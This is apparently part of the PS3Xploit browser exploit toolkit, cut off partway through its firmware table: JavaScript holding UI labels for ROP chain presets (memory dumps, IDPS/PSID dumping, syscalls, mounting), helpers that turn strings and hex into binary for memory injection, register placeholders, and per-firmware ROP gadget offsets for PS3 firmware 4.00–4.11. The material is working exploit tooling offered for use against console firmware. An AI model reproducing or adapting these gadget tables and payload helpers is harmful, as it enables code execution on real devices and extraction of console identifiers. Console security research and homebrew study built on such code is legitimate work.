var gui_txt_option_sys_storage_open="sys_storage_open";
var gui_txt_option_sys_storage_read="sys_storage_read";
var gui_txt_option_sys_fs_chmod="sys_fs_chmod";
var gui_txt_option_sys_fs_chown="sys_fs_chown";
var gui_txt_option_sys_fs_get_fs_info="sys_fs_get_fs_info";
var gui_txt_option_sys_fs_get_mount_info="sys_fs_get_mount_info";
var gui_txt_option_sys_fs_link="sys_fs_link";
var gui_txt_option_sys_fs_mapped_allocate="sys_fs_mapped_allocate";
var gui_txt_option_sys_fs_mapped_free="sys_fs_mapped_free";
var gui_txt_option_sys_fs_mkdir="sys_fs_mkdir";
var gui_txt_option_sys_fs_mount="sys_fs_mount";
var gui_txt_option_sys_fs_rename="sys_fs_rename";
var gui_txt_option_sys_fs_rmdir="sys_fs_rmdir";
var gui_txt_option_sys_fs_stat="sys_fs_stat";
var gui_txt_option_sys_fs_symbolic_link="sys_fs_symbolic_link";
var gui_txt_option_sys_fs_unlink="sys_fs_unlink";
var gui_txt_option_sys_fs_unmount="sys_fs_unmount";

// System
var gui_txt_option_sys_ss_utoken_if="sys_ss_utoken_if";

// Process
var gui_txt_option_sys_process_exit="sys_process_exit";
var gui_txt_option_sys_process_kill="sys_process_kill";

// Threads
var gui_txt_option_ppu_thread_get_priority="thread_get_priority";
var gui_txt_option_ppu_thread_get_stack_info="thread_get_stack_info";
var gui_txt_option_sys_ppu_thread_create="sys_ppu_thread_create";
var gui_txt_option_sys_ppu_thread_exit="sys_ppu_thread_exit";
var gui_txt_option_sys_ppu_thread_restart="sys_ppu_thread_restart";
var gui_txt_option_sys_ppu_thread_start="sys_ppu_thread_start";
var gui_txt_option_sys_ppu_thread_stop="sys_ppu_thread_stop";

// Network
var gui_txt_syscall_chains_sys_net="sys_net";
var gui_txt_option_sys_net_open_dump="sys_net_open_dump";
var gui_txt_option_sys_net_read_dump="sys_net_read_dump";
var gui_txt_option_sys_net_write_dump="sys_net_write_dump";
var gui_txt_option_sys_net_close_dump="sys_net_close_dump";

// LED Control
var gui_txt_option_sys_sm_request_led="sys_sm_request_led";
var gui_txt_option_sys_sm_control_led="sys_sm_control_led";

// File Permissions
var gui_txt_option_chmod="chmod";
var gui_txt_option_chown="chown";

// Default Title ID
var gui_txt_set_titleid="PS3XPLOIT";

// Default Found Offsets
var gui_txt_search_found_offsets=": base_fp: 0x0 | stack_frame_addr: 0x0 | jump_2_addr: 0x0 | jump_1_addr: 0x0</b></h4>";
// Default GUI For HTML
// PS3Xploit Team 2018 / ps3xploit.com


/*
 SelectNav.js (v. 0.1)
 Converts your <ul>/<ol> navigation into a dropdown list for small screens
 https://github.com/lukaszfiszer/selectnav.js
*/
// window.selectnav=function(){"use strict";var e=function(e,t){function c(e){var t;if(!e)e=window.event;if(e.target)t=e.target;else if(e.srcElement)t=e.srcElement;if(t.nodeType===3)t=t.parentNode;if(t.value)window.location.href=t.value}function h(e){var t=e.nodeName.toLowerCase();return t==="ul"||t==="ol"}function p(e){for(var t=1;document.getElementById("selectnav"+t);t++);return e?"selectnav"+t:"selectnav"+(t-1)}function d(e){a++;var t=e.children.length,n="",l="",c=a-1;if(!t){return}if(c){while(c--){l+=o}l+=" "}for(var v=0;v<t;v++){var m=e.children[v].children[0];if(typeof m!=="undefined"){var g=m.innerText||m.textContent;var y="";if(r){y=m.className.search(r)!==-1||m.parentNode.className.search(r)!==-1?f:""}if(i&&!y){y=m.href===document.URL?f:""}n+='<option value="'+m.href+'" '+y+">"+l+g+"</option>";if(s){var b=e.children[v].children[1];if(b&&h(b)){n+=d(b)}}}}if(a===1&&u){n='<option value="">'+u+"</option>"+n}if(a===1){n='<select class="selectnav" id="'+p(true)+'">'+n+"</select>"}a--;return n}e=document.getElementById(e);if(!e){return}if(!h(e)){return}if(!("insertAdjacentHTML"in window.document.documentElement)){return}document.documentElement.className+=" js";var n=t||{},r=n.activeclass||"active",i=typeof n.autoselect==="boolean"?n.autoselect:true,s=typeof n.nested==="boolean"?n.nested:true,o=n.indent||"→",u=n.label||"- Navigation -",a=0,f=" selected ";e.insertAdjacentHTML("afterend",d(e));var l=document.getElementById(p());if(l.addEventListener){l.addEventListener("change",c)}if(l.attachEvent){l.attachEvent("onchange",c)}return l};return function(t,n){e(t,n)}}()


// GUI Text Display
function showGuiText()
{
    // Top Text
    document.getElementById('fwVerText').innerHTML=msg_detected_fw_1 + vshType + msg_detected_fw_2 + fwVersion + msg_detected_fw_4;
    document.getElementById('gui_title').innerHTML=gui_title + gui_version;
    document.getElementById('gui_team').innerHTML=guy_by + gui_team;
    document.getElementById('gui_credits').innerHTML=gui_credits;
    
    // Checkboxes First Section
    document.getElementById('gui_chk_default_settings').innerHTML=gui_chk_default_settings;
    document.getElementById('gui_chk_disable_trigger').innerHTML=gui_chk_disable_trigger;
    document.getElementById('gui_chk_write_protect').innerHTML=gui_chk_write_protect;
    document.getElementById('gui_chk_flash_type_nand').innerHTML=gui_chk_flash_type_nand;
    document.getElementById('gui_chk_flash_type_nor').innerHTML=gui_chk_flash_type_nor;
    document.getElementById('gui_chk_flash_type_emmc').innerHTML=gui_chk_flash_type_emmc;
    
    // Reboot Mode
    document.getElementById('gui_chk_reboot_mode').innerHTML=gui_chk_reboot_mode;
    document.getElementById('gui_chk_reboot_mode_select').innerHTML=gui_chk_reboot_mode_select;
    document.getElementById('gui_chk_reboot_mode_soft').innerHTML=gui_chk_reboot_mode_soft;
    document.getElementById('gui_chk_reboot_mode_hard').innerHTML=gui_chk_reboot_mode_hard;
    document.getElementById('gui_chk_reboot_mode_off').innerHTML=gui_chk_reboot_mode_off;
    
    // ROP Chain Text

    // Preset Chains
    document.getElementById('gui_txt_preset_chains').innerHTML=gui_txt_preset_chains;
    document.getElementById('gui_txt_preset_chains_default').innerHTML=gui_txt_preset_chains_default;
    // document.getElementById('gui_txt_option_stackframe_test').innerHTML=gui_txt_option_stackframe_test;
    document.getElementById('gui_txt_option_beep_test').innerHTML=gui_txt_option_beep_test;
    document.getElementById('gui_txt_option_power_test').innerHTML=gui_txt_option_power_test;
    document.getElementById('gui_txt_option_minver_check').innerHTML=gui_txt_option_minver_check;
    document.getElementById('gui_txt_option_sys_game_get_temperature').innerHTML=gui_txt_option_sys_game_get_temperature;
    //document.getElementById('gui_txt_option_game_debug_pafjob_test').innerHTML=gui_txt_option_game_debug_pafjob_test;
    // document.getElementById('gui_txt_option_console_write_test').innerHTML=gui_txt_option_console_write_test;
    // document.getElementById('gui_txt_option_sys_tty_read').innerHTML=gui_txt_option_sys_tty_read;
    // document.getElementById('gui_txt_option_sys_tty_write').innerHTML=gui_txt_option_sys_tty_write;
    
    // Dumping
    document.getElementById('gui_txt_preset_chains_dumping').innerHTML=gui_txt_preset_chains_dumping;
    document.getElementById('gui_txt_option_webkit_search_area').innerHTML=gui_txt_option_webkit_search_area;
    document.getElementById('gui_txt_option_system_info_multi_dump').innerHTML=gui_txt_option_system_info_multi_dump;
    document.getElementById('gui_txt_option_dump_lv2_syscall_table').innerHTML=gui_txt_option_dump_lv2_syscall_table;
    document.getElementById('gui_txt_option_mem_dump_test').innerHTML=gui_txt_option_mem_dump_test;
    document.getElementById('gui_txt_option_get_open_psid').innerHTML=gui_txt_option_get_open_psid;
    document.getElementById('gui_txt_option_dump_idps_from_mem').innerHTML=gui_txt_option_dump_idps_from_mem;
    document.getElementById('gui_txt_option_sys_net_dump').innerHTML=gui_txt_option_sys_net_dump;
    document.getElementById('gui_txt_sys_sm_get_platform_info').innerHTML=gui_txt_sys_sm_get_platform_info;
    // document.getElementById('gui_txt_option_dump_idps_from_flash').innerHTML=gui_txt_option_dump_idps_from_flash;
    
    // File System
    document.getElementById('gui_txt_preset_chains_file_system').innerHTML=gui_txt_preset_chains_file_system;
    document.getElementById('gui_txt_option_create_new_user').innerHTML=gui_txt_option_create_new_user;
    document.getElementById('gui_txt_option_db_rebuild').innerHTML=gui_txt_option_db_rebuild;
    document.getElementById('gui_txt_option_file_read_write_test').innerHTML=gui_txt_option_file_read_write_test;
    document.getElementById('gui_txt_option_dir_read_write_test').innerHTML=gui_txt_option_dir_read_write_test;
    
    // Fun
    document.getElementById('gui_txt_preset_chains_fun').innerHTML=gui_txt_preset_chains_fun;
    // document.getElementById('gui_txt_option_fun_test').innerHTML=gui_txt_option_fun_test;
    document.getElementById('gui_txt_option_xmb_plugin_test').innerHTML=gui_txt_option_xmb_plugin_test;
    document.getElementById('gui_txt_option_busy_icon_test').innerHTML=gui_txt_option_busy_icon_test;
    document.getElementById('gui_txt_option_vsh_printf_test').innerHTML=gui_txt_option_vsh_printf_test;
    
    
    // Other Syscall Chains

    // Memory/System
    document.getElementById('gui_txt_syscall_group_mem_sys').innerHTML=gui_txt_syscall_group_mem_sys;
    document.getElementById('gui_txt_syscall_chains_mem_sys').innerHTML=gui_txt_syscall_chains_mem_sys;
    document.getElementById('gui_txt_option_sys_rsx_memory_free').innerHTML=gui_txt_option_sys_rsx_memory_free;
    
    // Storage
    document.getElementById('gui_txt_syscall_chains_storage').innerHTML=gui_txt_syscall_chains_storage;
    document.getElementById('gui_txt_option_sys_storage_report_devices').innerHTML=gui_txt_option_sys_storage_report_devices;
    // document.getElementById('gui_txt_option_sys_storage_open').innerHTML=gui_txt_option_sys_storage_open;
    // document.getElementById('gui_txt_option_sys_storage_read').innerHTML=gui_txt_option_sys_storage_read;
    document.getElementById('gui_txt_option_sys_fs_chmod').innerHTML=gui_txt_option_sys_fs_chmod;
    document.getElementById('gui_txt_option_sys_fs_chown').innerHTML=gui_txt_option_sys_fs_chown;
    document.getElementById('gui_txt_option_sys_fs_get_fs_info').innerHTML=gui_txt_option_sys_fs_get_fs_info;
    document.getElementById('gui_txt_option_sys_fs_get_mount_info').innerHTML=gui_txt_option_sys_fs_get_mount_info;
    document.getElementById('gui_txt_option_sys_fs_link').innerHTML=gui_txt_option_sys_fs_link;
    document.getElementById('gui_txt_option_sys_fs_mapped_allocate').innerHTML=gui_txt_option_sys_fs_mapped_allocate;
    document.getElementById('gui_txt_option_sys_fs_mapped_free').innerHTML=gui_txt_option_sys_fs_mapped_free;
    document.getElementById('gui_txt_option_sys_fs_mkdir').innerHTML=gui_txt_option_sys_fs_mkdir;
    document.getElementById('gui_txt_option_sys_fs_mount').innerHTML=gui_txt_option_sys_fs_mount;
    document.getElementById('gui_txt_option_sys_fs_rename').innerHTML=gui_txt_option_sys_fs_rename;
    document.getElementById('gui_txt_option_sys_fs_rmdir').innerHTML=gui_txt_option_sys_fs_rmdir;
    document.getElementById('gui_txt_option_sys_fs_stat').innerHTML=gui_txt_option_sys_fs_stat;
    document.getElementById('gui_txt_option_sys_fs_symbolic_link').innerHTML=gui_txt_option_sys_fs_symbolic_link;
    document.getElementById('gui_txt_option_sys_fs_unlink').innerHTML=gui_txt_option_sys_fs_unlink;
    document.getElementById('gui_txt_option_sys_fs_unmount').innerHTML=gui_txt_option_sys_fs_unmount;
    
    // System
    document.getElementById('gui_txt_syscall_chains_system').innerHTML=gui_txt_syscall_chains_system;
    document.getElementById('gui_txt_option_sys_ss_utoken_if').innerHTML=gui_txt_option_sys_ss_utoken_if;
    
    
    // Process/Thread
    
    // Process
    document.getElementById('gui_txt_syscall_group_proc_thread').innerHTML=gui_txt_syscall_group_proc_thread;
    document.getElementById('gui_txt_syscall_chains_proc_thread').innerHTML=gui_txt_syscall_chains_proc_thread;
    document.getElementById('gui_txt_option_sys_process_exit').innerHTML=gui_txt_option_sys_process_exit;
    document.getElementById('gui_txt_option_sys_process_kill').innerHTML=gui_txt_option_sys_process_kill;
    
    document.getElementById('gui_txt_syscall_chains_process').innerHTML=gui_txt_syscall_chains_process;
    
    // Threads
    document.getElementById('gui_txt_syscall_chains_threads').innerHTML=gui_txt_syscall_chains_threads;
    document.getElementById('gui_txt_option_ppu_thread_get_priority').innerHTML=gui_txt_option_ppu_thread_get_priority;
    document.getElementById('gui_txt_option_ppu_thread_get_stack_info').innerHTML=gui_txt_option_ppu_thread_get_stack_info;
    document.getElementById('gui_txt_option_sys_ppu_thread_create').innerHTML=gui_txt_option_sys_ppu_thread_create;
    document.getElementById('gui_txt_option_sys_ppu_thread_exit').innerHTML=gui_txt_option_sys_ppu_thread_exit;
    document.getElementById('gui_txt_option_sys_ppu_thread_restart').innerHTML=gui_txt_option_sys_ppu_thread_restart;
    document.getElementById('gui_txt_option_sys_ppu_thread_start').innerHTML=gui_txt_option_sys_ppu_thread_start;
    document.getElementById('gui_txt_option_sys_ppu_thread_stop').innerHTML=gui_txt_option_sys_ppu_thread_stop;
    
    // Thread ID
    document.getElementById('gui_txt_syscall_chains_thread_id').innerHTML=gui_txt_syscall_chains_thread_id;
    
    
    // Network
    document.getElementById('gui_txt_syscall_group_network').innerHTML=gui_txt_syscall_group_network;
    document.getElementById('gui_txt_syscall_chains_sys_net').innerHTML=gui_txt_syscall_chains_sys_net;
    document.getElementById('gui_txt_option_sys_net_open_dump').innerHTML=gui_txt_option_sys_net_open_dump;
    document.getElementById('gui_txt_option_sys_net_read_dump').innerHTML=gui_txt_option_sys_net_read_dump;
    document.getElementById('gui_txt_option_sys_net_write_dump').innerHTML=gui_txt_option_sys_net_write_dump;
    document.getElementById('gui_txt_option_sys_net_close_dump').innerHTML=gui_txt_option_sys_net_close_dump;
    
    document.getElementById('gui_txt_option_url').innerHTML=gui_txt_option_url;
    
    
    // Debugging
    document.getElementById('gui_txt_syscall_group_debugging').innerHTML=gui_txt_syscall_group_debugging;
    document.getElementById('gui_txt_syscall_chains_debug_sc').innerHTML=gui_txt_syscall_chains_debug_sc;
    document.getElementById('gui_txt_option_debug_placeholder').innerHTML=gui_txt_option_debug_placeholder;
    
    // LED Control
    document.getElementById('gui_txt_syscall_group_led').innerHTML=gui_txt_syscall_group_led;
    document.getElementById('gui_txt_syscall_chains_led').innerHTML=gui_txt_syscall_chains_led;
    document.getElementById('gui_txt_option_sys_sm_request_led').innerHTML=gui_txt_option_sys_sm_request_led;
    document.getElementById('gui_txt_option_sys_sm_control_led').innerHTML=gui_txt_option_sys_sm_control_led;
    
    document.getElementById('gui_txt_syscall_chains_led_color').innerHTML=gui_txt_syscall_chains_led_color;
    document.getElementById('gui_txt_option_led_color_green').innerHTML=gui_txt_option_led_color_green;
    document.getElementById('gui_txt_option_led_color_yellow_red').innerHTML=gui_txt_option_led_color_yellow_red;
    document.getElementById('gui_txt_option_led_color_off').innerHTML=gui_txt_option_led_color_off;
    
    document.getElementById('gui_txt_syscall_chains_led_action').innerHTML=gui_txt_syscall_chains_led_action;
    document.getElementById('gui_txt_option_led_action_on').innerHTML=gui_txt_option_led_action_on;
    document.getElementById('gui_txt_option_led_action_off').innerHTML=gui_txt_option_led_action_off;
    document.getElementById('gui_txt_option_led_action_blink_fast').innerHTML=gui_txt_option_led_action_blink_fast;
    document.getElementById('gui_txt_option_led_action_blink_slow').innerHTML=gui_txt_option_led_action_blink_slow;
    
    
    // Beep parameters
    document.getElementById('gui_txt_syscall_group_beep_params').innerHTML=gui_txt_syscall_group_beep_params;
    document.getElementById('gui_txt_syscall_chains_beeps').innerHTML=gui_txt_syscall_chains_beeps;
    document.getElementById('gui_txt_option_beep_off').innerHTML=gui_txt_option_beep_off;
    document.getElementById('gui_txt_option_beep_3').innerHTML=gui_txt_option_beep_3;
    document.getElementById('gui_txt_option_beep_2').innerHTML=gui_txt_option_beep_2;
    document.getElementById('gui_txt_option_beep_2f').innerHTML=gui_txt_option_beep_2f;
    document.getElementById('gui_txt_option_beep_1').innerHTML=gui_txt_option_beep_1;
    document.getElementById('gui_txt_option_beep_1f').innerHTML=gui_txt_option_beep_1f;
    document.getElementById('gui_txt_option_beep_flatline').innerHTML=gui_txt_option_beep_flatline;
    
    // Memory Dump
    document.getElementById('gui_txt_syscall_group_memdump').innerHTML=gui_txt_syscall_group_memdump;
    document.getElementById('gui_txt_memdump_addresses').innerHTML=gui_txt_memdump_addresses;
    document.getElementById('gui_txt_memdump_size').innerHTML=gui_txt_memdump_size;
    document.getElementById('gui_txt_memdump_range_presets').innerHTML=gui_txt_memdump_range_presets;
    document.getElementById('gui_txt_option_memdump_presets_default').innerHTML=gui_txt_option_memdump_presets_default;
    
    document.getElementById('gui_txt_memdump_address_start').innerHTML=gui_txt_memdump_address_start;
    document.getElementById('gui_txt_memdump_address_end').innerHTML=gui_txt_memdump_address_end;
    document.getElementById('gui_txt_btn_memdump_set_values').innerHTML=gui_txt_btn_memdump_set_values;
    
    document.getElementById('gui_txt_mounting_setup').innerHTML=gui_txt_mounting_setup;
    document.getElementById('gui_txt_option_mount_device').innerHTML=gui_txt_option_mount_device;
    document.getElementById('gui_txt_option_mount_fs').innerHTML=gui_txt_option_mount_fs;
    document.getElementById('gui_txt_option_mount_path').innerHTML=gui_txt_option_mount_path;
    
    document.getElementById('gui_txt_group_user_id').innerHTML=gui_txt_group_user_id;
    document.getElementById('gui_txt_option_user_id_default').innerHTML=gui_txt_option_user_id_default;
    
    
    document.getElementById('gui_txt_group_permissions').innerHTML=gui_txt_group_permissions;
    document.getElementById('gui_txt_option_chmod').innerHTML=gui_txt_option_chmod;
    document.getElementById('gui_txt_option_chown').innerHTML=gui_txt_option_chown;
    
    document.getElementById('gui_txt_group_filesize').innerHTML=gui_txt_group_filesize;
    document.getElementById('gui_txt_group_titleid').innerHTML=gui_txt_group_titleid;
    
    document.getElementById('gui_txt_btn_set_filesize').innerHTML=gui_txt_btn_set_filesize;
    document.getElementById('gui_txt_btn_set_titleid').innerHTML=gui_txt_btn_set_titleid;
    
    document.getElementById('gui_txt_group_path_source').innerHTML=gui_txt_group_path_source;
    document.getElementById('gui_txt_group_path_destination').innerHTML=gui_txt_group_path_destination;
    
    
    // XMB Transfer
    document.getElementById('gui_txt_syscall_group_xmb_transfer').innerHTML=gui_txt_syscall_group_xmb_transfer;
    document.getElementById('gui_txt_option_xmb_photo').innerHTML=gui_txt_option_xmb_photo;
    document.getElementById('gui_txt_option_xmb_music').innerHTML=gui_txt_option_xmb_music;
    document.getElementById('gui_txt_option_xmb_video').innerHTML=gui_txt_option_xmb_video;
    document.getElementById('gui_txt_option_xmb_jpg_btn').innerHTML=gui_txt_option_xmb_jpg_btn;
    document.getElementById('gui_txt_option_xmb_mp3_btn').innerHTML=gui_txt_option_xmb_mp3_btn;
    document.getElementById('gui_txt_option_xmb_mp4_btn').innerHTML=gui_txt_option_xmb_mp4_btn;
    document.getElementById('gui_txt_option_xmb_save_msg').innerHTML=gui_txt_option_xmb_save_msg;
    
    // document.getElementById('gui_txt_group_payload_type').innerHTML=gui_txt_group_payload_type;
    // document.getElementById('gui_txt_group_payload_type_help').innerHTML=gui_txt_group_payload_type_help;
    
    
    // String Search
    document.getElementById('gui_txt_group_string_search').innerHTML=gui_txt_group_string_search;
    document.getElementById('gui_txt_option_search_size').innerHTML=gui_txt_option_search_size;
    document.getElementById('gui_txt_option_search_base').innerHTML=gui_txt_option_search_base;
    document.getElementById('gui_txt_option_search_stack').innerHTML=gui_txt_option_search_stack;
    document.getElementById('gui_txt_option_search_range').innerHTML=gui_txt_option_search_range;
    document.getElementById('gui_txt_option_search_loops').innerHTML=gui_txt_option_search_loops;
    
    document.getElementById('gui_chk_search_verify_jumps').innerHTML=gui_chk_search_verify_jumps;
    document.getElementById('gui_chk_search_verify_stackframe').innerHTML=gui_chk_search_verify_stackframe;
    document.getElementById('gui_chk_search_debug_output').innerHTML=gui_chk_search_debug_output;
    
    document.getElementById('msg_search_ready').innerHTML=msg_search_ready;
    document.getElementById('gui_txt_search_found_offsets').innerHTML=msg_found_offsets + gui_txt_search_found_offsets;
    
    document.getElementById('gui_txt_option_init_rop_btn').innerHTML=gui_txt_option_init_rop_btn;
    document.getElementById('gui_txt_option_exec_rop_btn').innerHTML=gui_txt_option_exec_rop_btn;
    document.getElementById('gui_txt_option_reload_page_btn').innerHTML=gui_txt_option_reload_page_btn;
    document.getElementById('gui_txt_option_reset_btn').innerHTML=gui_txt_option_reset_btn;
    document.getElementById('gui_txt_option_load_settings_btn').innerHTML=gui_txt_option_load_settings_btn;
    document.getElementById('gui_txt_option_save_settings_btn').innerHTML=gui_txt_option_save_settings_btn;
    document.getElementById('gui_txt_option_debug_show_var_btn').innerHTML=gui_txt_option_debug_show_var_btn;
}

// PS3 Utilities Template
// PS3Xploit Team 2018 / ps3xploit.com


// Begin Functions

String.prototype.setCharAt = function(index,chr)
{
    if(index > this.length-1) {return this;}
    return this.substr(0,index)+chr+this.substr(index+1);
};

String.prototype.toHex8 = function()
{
    return ('00' + this).substr(-2);
};

String.prototype.toHex16 = function()
{
    return ('0000' + this).substr(-4);
};

String.prototype.toHex32 = function()
{
    return ('00000000' + this).substr(-8);
};

String.prototype.asciiAt = function(i)
{
    return this.charCodeAt(i)&0xFF;
};

String.prototype.toAscii = function(hex_16)
{
    var ascii='';
    var i=0;
    while(i<this.length){if(hex_16===true){ascii += this.charCodeAt(i).toString(16).toHex16();} else {ascii += this.charCodeAt(i).toString(16);}i+=1;}
    return ascii;
};

String.prototype.convert=function(ascii)
{
    if(this.length<1){return '';}
    var asciistr='';var asciichr='';var i=0;var ret=[];
    if(ascii===true){asciistr = this;}
    else {asciistr = this.toAscii();}
    while((asciistr.length%4)!==0){asciistr+='00';}
    if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
    while(i<asciistr.length){
        asciichr = asciistr.substr(i, 4);
        ret.push(String.fromCharCode(parseInt(asciichr, 16)));
        i+=4;
    }
    return ret.join('');
};

String.prototype.convertedSize = function(ascii)
{
    if(this.length<1){return 0;}
    var asciistr='';
    if(ascii===true){asciistr=this;}
    else {asciistr = this.toAscii();}
    while((asciistr.length%4)!==0){asciistr+='00';}
    if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
    return asciistr.length/2;
};

String.prototype.replaceAt=function(index, ch)
{
    return this.substr(0,index)+ch+this.substr(index+ch.length);
};

String.prototype.repeat = function(num)
{
    return new Array(num+1).join(this);
};

/*
function asciiAt(str, i)
{
    return str.charCodeAt(i)&0xFF;
}
*/

function str2ascii(str)
{
    var ascii = "";
    var i = 0;
    for (; i < str.length; i++){ascii += str.charCodeAt(i).toString(16);}
    return ascii;
}

function hexToBytes(hex)
{
    var bytes = [];
    for (var c = 0; c < hex.length; c += 2)
    bytes.push(parseInt(hex.substr(c, 2), 16));
    return bytes;
}

/*
function Repeat(s, n)
{
    var a = [];
    while(a.length < n)
    {
        a.push(s);
    }
    return a.join('');
}
*/

function hexh2bin(hex_val)
{
    return String.fromCharCode(hex_val);
}


function hexw2bin(hex_val)
{
    return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val);
}

function hexdw2bin(hex_val) // 32bit support only (due to javascript 53bit integer limitation)
{
    return hexw2bin(0) + hexw2bin(hex_val); // 00000000 padding
}

function k_hexdw2bin(hex_val) // 32bit support only (due to javascript 53bit integer limitation)
{
    return hexw2bin(0x80000000) + hexw2bin(hex_val); // 80000000 padding
}

function s2hex(str)
{
    var hex = [];
    var  i = 0;
    for (;i < str.length; i++) {
        hex.push(hex16(str.charCodeAt(i).toString(16)));
    }
    return hex.join("");
}

function bytesToHex(str)
{
    var hex = [];
    for (var  i = 0; i < str.length; i++) {
        if(str.charCodeAt(i)==0){
            hex.push(hex8((str.charCodeAt(i) >>> 4).toString(16)));
            hex.push(hex8((str.charCodeAt(i) & 0xF).toString(16)));
        }
        else
        {
            hex.push((str.charCodeAt(i) >>> 4).toString(16));
            hex.push((str.charCodeAt(i) & 0xF).toString(16));
        }
    }
    return hex.join("");
}

function hex32(s)
{
    return ('00000000' + s).substr(-8);
}

function hex16(s)
{
    return ('0000' + s).slice(-4)
}

function hex8(s)
{
    return ('00' + s).substr(-2);
}

function sleep(milliseconds)
{
    var start = new Date().getTime();
    for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds)break;
    }
}


// String To Unescape
function str2u(str)
{
    var asciistr = str2ascii(str);
    if((asciistr.length%4)!=0){asciistr+='00';str2u_adjusted=true;}
    var asciichr;
    var ret = [];
    var i;
    var len;
    for(i = 0, len = asciistr.length; i < len; i += 4) {
       asciichr = asciistr.substr(i, 4);
       ret.push(String.fromCharCode(parseInt(asciichr, 16)));
    }
    return ret.join('');
}

function bin2unescape(str, n)
{
   var a = [], start=0;
   while(start<str.length) {
   if (a === "\0") {
    str.replace("\0", "\\0");
   }
      a.push(str.slice(start, start+n));
      start+=n;
   }
   return (a.join("" + "\\u"));
}

function logAdd(txt)
{
    if(debug_mode===true)
    {
        if(document.getElementById('log').innerHTML==="")setInnerHTML(document.getElementById('log'),hr);
        addInnerHTML(document.getElementById('log'),txt + br); 
    }
}

function logEntry()
{
        var _logger = document.getElementById("log");
        while (_logger.firstChild) {_logger.removeChild(_logger.firstChild);}
        if (!_logger) return 0;
        var logger = document.createElement("div");
        if (_logger.hasChildNodes()){
            _logger.insertBefore(logger, _logger.firstChild);
        }else{
            _logger.appendChild(logger);
        }
        return logger;
}

function clearLogEntry()
{
    setInnerHTML(document.getElementById('log'),"");
}

function writeEnvInfo()
{
    setInnerHTML(document.getElementById('footer'),hr+ua_msg);
}

/*
function setCharAt(str,index,chr)
{
    if(index > str.length-1) return str;
    return str.substr(0,index) + chr + str.substr(index+1);
}
*/

/*
String.prototype.replaceAt=function(index, ch){
    return this.substr(0, index) + ch + this.substr(index+ch.length);
}
*/

// Spoiler On Main HTML Page
function showSpoiler(obj)
{
    var inner = obj.parentNode.getElementsByTagName("div")[0];
    if (inner.style.display == "none")
        inner.style.display = "";
    else
        inner.style.display = "none";
}

function setCookie(value){
    cookie_set=document.cookie = value;
}

function getCookie(){
    cookie_get=document.cookie;
    return cookie_get;
}


// PS3 Register Values
// PS3Xploit Team 2018 / ps3xploit.com


// Default
var r0=0x80140000
var r1=0x80140010
var r2=0x80140020
var r3=0x80140030
var r4=0x80140040
var r5=0x80140050
var r6=0x80140060
var r7=0x80140070
var r8=0x80140080
var r9=0x80140090
var r10=0x80140100
var r11=0x80140110
var r12=0x80140120
var r13=0x80140130
var r14=0x80140140
var r15=0x80140150
var r16=0x80140160
var r17=0x80140170
var r18=0x80140180
var r19=0x80140190
var r20=0x80140200
var r21=0x80140210
var r22=0x80140220
var r23=0x80140230
var r24=0x80140240
var r25=0x80140250
var r26=0x80140260
var r27=0x80140270
var r28=0x80140280
var r29=0x80140290
var r30=0x80140300
var r31=0x80140310

// Temp Registers (these will get overwritten at some point)
var r0_temp=0x80140000
var r1_temp=0x80140010
var r2_temp=0x80140020
var r3_temp=0x80140030
var r4_temp=0x80140040
var r5_temp=0x80140050
var r6_temp=0x80140060
var r7_temp=0x80140070
var r8_temp=0x80140080
var r9_temp=0x80140090
var r10_temp=0x80140100
var r11_temp=0x80140110
var r12_temp=0x80140120
var r13_temp=0x80140130
var r14_temp=0x80140140
var r15_temp=0x80140150
var r16_temp=0x80140160
var r17_temp=0x80140170
var r18_temp=0x80140180
var r19_temp=0x80140190
var r20_temp=0x80140200
var r21_temp=0x80140210
var r22_temp=0x80140220
var r23_temp=0x80140230
var r24_temp=0x80140240
var r25_temp=0x80140250
var r26_temp=0x80140260
var r27_temp=0x80140270
var r28_temp=0x80140280
var r29_temp=0x80140290
var r30_temp=0x80140300
var r31_temp=0x80140310

// PS3 Compatibility Check and Gadget Offsets
// PS3Xploit Team 2018 / ps3xploit.com


// Check User Agent Against Firmware Version
function ps3chk(){
    compat_msg_wrong_fw=compat_msg_wrong_fw1 + fwVersion + compat_msg_wrong_fw2;
    compat_msg_success=compat_msg_success1 + fwVersion + compat_msg_success2;

    if (current_minimum_lang_revision != global_minimum_lang_revision)
        alert(gui_incomplete_lang);

    switch (uaStringCheck) {
        case "PLAYSTATION":
            isPlaystation = true;
            break;

        default:
            alert(compat_msg_nops3);
            disableFeatures = true;
            isPlaystation = false;
            document.getElementById("load_rop").disabled=true;
            break;
    }

    if (isPlaystation) {
        
        //alert(experimental);
        
        if (true)
        {
            switch (fwVersion) 
            {
                    
                // 4.00 CEX
                case fwCompat[0]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6E4C20;
                g_1=0x0D8644;
                g_2=0x096EC0;
                g_set_r4_thru_r11=0x5FE0A0;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x4208A0;
                g_set_r3_with_ld=0x196310;
                g_sc_80=0x0D8644;
                g_sc_90=0x41F6E0;
                g_sc_A0=0x1697BC;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x3113F4;
                e_fopen_write_close=0x416AE8;
                s_mount_hdd1=0x61F9FC;
                g_init_reboot=0x0C4830;
                g_init_shutdown=0x0C47F8;
                g_exit_chain=0x2AA664;
                //showOffsets();
                break;
                    
                // 4.10 CEX
                case fwCompat[1]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6E4D50;
                g_1=0x0D8634;
                g_2=0x096EC0;
                g_set_r4_thru_r11=0x600728;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x422CD8;
                g_set_r3_with_ld=0x196994;
                g_sc_80=0x0D8634;
                g_sc_90=0x421B18;
                g_sc_A0=0x169E40;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x313824;
                e_fopen_write_close=0x418F20;
                s_mount_hdd1=0x622084;
                g_init_reboot=0x0C4830;
                g_init_shutdown=0x0C47F8;
                g_exit_chain=0x2ACAE0;
                //showOffsets();
                break;
                    
                // 4.11 CEX
                case fwCompat[2]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6E4D50;
                g_1=0x0D8668;
                g_2=0x096EC0;
                g_set_r4_thru_r11=0x600764;
